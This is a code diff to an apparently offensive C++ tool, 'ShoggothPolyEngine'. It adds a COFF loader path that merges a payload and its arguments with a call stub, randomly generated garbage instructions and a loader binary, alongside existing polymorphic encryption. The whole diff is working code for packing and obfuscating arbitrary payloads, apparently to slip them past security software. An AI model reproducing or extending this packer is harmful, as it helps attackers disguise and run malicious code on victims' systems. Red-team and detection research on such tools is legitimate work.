@@ -3,7 +3,7 @@
 #include <iostream>
 
 
-ShoggothPolyEngine::ShoggothPolyEngine(bool shellcodeMode):
+ShoggothPolyEngine::ShoggothPolyEngine(bool shellcodeMode,bool coffMode):
     allRegs{ x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::rsp, x86::rbp, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 },
     generalPurposeRegs { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 }
     {
@@ -73,6 +73,119 @@ PBYTE ShoggothPolyEngine::AddReflectiveLoader(PBYTE payload, int payloadSize, in
     return payloadWithLoader;
 }
 
+
+/*
+00007FF6BB58511B  xor         r8d,r8d
+00007FF6BB58511E  xor         edx,edx
+00007FF6BB585120  mov         rcx,qword ptr [test]
+*/
+
+PBYTE ShoggothPolyEngine::AddCOFFLoader(PBYTE payload, int payloadSize, PBYTE arguments, int argumentSize, int& newPayloadSize) {
+    int coffLoaderSize = 0;
+    int callStubSize = 0;
+    int payloadWithCallSize = 0;
+    int popStubSize = 0;
+    int payloadWithCallAndPopSize = 0;
+    int payloadWithLoaderSize = 0;
+    int payloadAndArgumentSize = 0;
+    int newPayloadChunkSize = 0;
+    char stubFilePath[MAX_PATH] = { 0 };
+    PBYTE payloadAndArgument = NULL;
+    PBYTE newPayloadChunk = NULL;
+    PBYTE callStub = NULL;
+    PBYTE coffLoader = NULL;
+    PBYTE payloadWithCall = NULL;
+    PBYTE payloadWithCallAndPop = NULL;
+    PBYTE payloadWithLoader = NULL;
+    PBYTE popStub = NULL;
+
+    // If you want to use another stub, you should change this hardcoded string
+    snprintf(stubFilePath, MAX_PATH, "%s..\\stub\\COFFLoader.bin", SOLUTIONDIR);
+    // Read reflective loader binary
+    coffLoader = ReadBinary(stubFilePath, coffLoaderSize);
+    if (coffLoader == NULL || coffLoaderSize == 0) {
+        return NULL;
+    }
+    // Put a call to get payload address thanks to call instruction
+    callStub = this->GetCallInstructionOverPayloadAndArguments(payloadSize, argumentSize, callStubSize);
+    if (callStub == NULL || callStubSize == 0) {
+        std::cout << "[!] Error on assembling call instruction for COFF Loader!" << std::endl;
+        return NULL;
+    }
+
+    if (arguments) {
+        // Argument + argument size + payload
+        payloadAndArgument = MergeChunks(arguments, argumentSize, (PBYTE)&argumentSize, sizeof(int));
+        payloadAndArgumentSize = argumentSize + sizeof(int);
+
+        newPayloadChunk = MergeChunks(payloadAndArgument, payloadAndArgumentSize, payload, payloadSize);
+        newPayloadChunkSize = payloadSize + payloadAndArgumentSize;
+        VirtualFree(payload, 0, MEM_RELEASE);
+        VirtualFree(payloadAndArgument, 0, MEM_RELEASE);
+    }
+    else {
+        newPayloadChunk = payload;
+        newPayloadChunkSize = payloadSize;
+    }
+    
+    // Merge input binary and call stub
+    payloadWithCall = MergeChunks(callStub, callStubSize, newPayloadChunk, newPayloadChunkSize);
+    
+    this->asmjitRuntime.release(callStub);
+    // VirtualFree(callStub, 0, MEM_RELEASE);
+    // New payload size
+    payloadWithCallSize = payloadSize + callStubSize;
+
+    // Since input PE address is in stack now, we can create a garbage and pop it.
+    popStub = this->GenerateThreePopWithGarbage(x86::rcx, x86::rdx, x86::r8,argumentSize, popStubSize);
+
+    // Merge Call Stub and Pop stub
+    payloadWithCallAndPop = MergeChunks(payloadWithCall, payloadWithCallSize, popStub, popStubSize);
+    VirtualFree(popStub, 0, MEM_RELEASE);
+    VirtualFree(payloadWithCall, 0, MEM_RELEASE);
+
+    // New size
+    payloadWithCallAndPopSize = payloadWithCallSize + popStubSize;
+
+    // Merge reflective loader with payload
+    payloadWithLoader = MergeChunks(payloadWithCallAndPop, payloadWithCallAndPopSize, coffLoader, coffLoaderSize);
+    payloadWithLoaderSize = payloadWithCallAndPopSize + coffLoaderSize;
+    VirtualFree(payloadWithCallAndPop, 0, MEM_RELEASE);
+    VirtualFree(coffLoader, 0, MEM_RELEASE);
+    newPayloadSize = payloadWithLoaderSize;
+
+    return payloadWithLoader;
+}
+
+
+PBYTE ShoggothPolyEngine::GenerateThreePopWithGarbage(x86::Gp payloadReg, x86::Gp argumentReg, x86::Gp argumentSizeReg, int argumentSize, int& popStubSize) {
+    PBYTE popPtr = NULL;
+    PBYTE returnValue = NULL;
+    int garbageSize = 0;
+    int popSize = 0;
+
+    PBYTE garbageInstructions = this->GenerateRandomGarbage(garbageSize);
+    // Argument + argument size + payload
+    asmjitAssembler->pop(argumentReg);
+    if (argumentSize) {
+        asmjitAssembler->mov(argumentSizeReg, argumentReg);
+        asmjitAssembler->mov(payloadReg, argumentReg);
+        asmjitAssembler->add(argumentSizeReg, argumentSize);
+        asmjitAssembler->add(payloadReg, argumentSize + sizeof(int));
+    }
+    else {
+        asmjitAssembler->mov(payloadReg, argumentReg);
+        asmjitAssembler->add(payloadReg, sizeof(int));
+        asmjitAssembler->xor_(argumentReg,argumentReg);
+        asmjitAssembler->xor_(argumentSizeReg,argumentSizeReg);
+    }
+    popPtr = this->AssembleCodeHolder(popSize);
+    returnValue = MergeChunks(garbageInstructions, garbageSize, popPtr, popSize);
+    popStubSize = garbageSize + popSize;
+    VirtualFree(garbageInstructions, 0, MEM_RELEASE);
+    this->asmjitRuntime.release(popPtr);
+    return returnValue;
+}
 
 PBYTE  ShoggothPolyEngine::GeneratePopWithGarbage(x86::Gp popReg, int& popStubSize) {
     PBYTE popPtr = NULL;
@@ -251,6 +364,18 @@ PBYTE ShoggothPolyEngine::StartPolymorphicEncrypt(PBYTE payload, int payloadSize
     return returnValue;
 }
 
+PBYTE ShoggothPolyEngine::GetCallInstructionOverPayloadAndArguments(int payloadSize,int argumentSize, int& callSize) {
+    this->asmjitCodeHolder.flatten();
+    this->asmjitCodeHolder.relocateToBase(0x00);
+    int callOffset = payloadSize + argumentSize;
+    // Directly generate a call instruction over payloadsize
+    if (argumentSize) {
+        callOffset += sizeof(int);
+    }
+    asmjitAssembler->call(callOffset + 5);
+    // Assemble the buffer
+    return this->AssembleCodeHolder(callSize);
+}
 
 PBYTE ShoggothPolyEngine::GetCallInstructionOverPayload(int payloadSize,int &callSize) {
     this->asmjitCodeHolder.flatten();
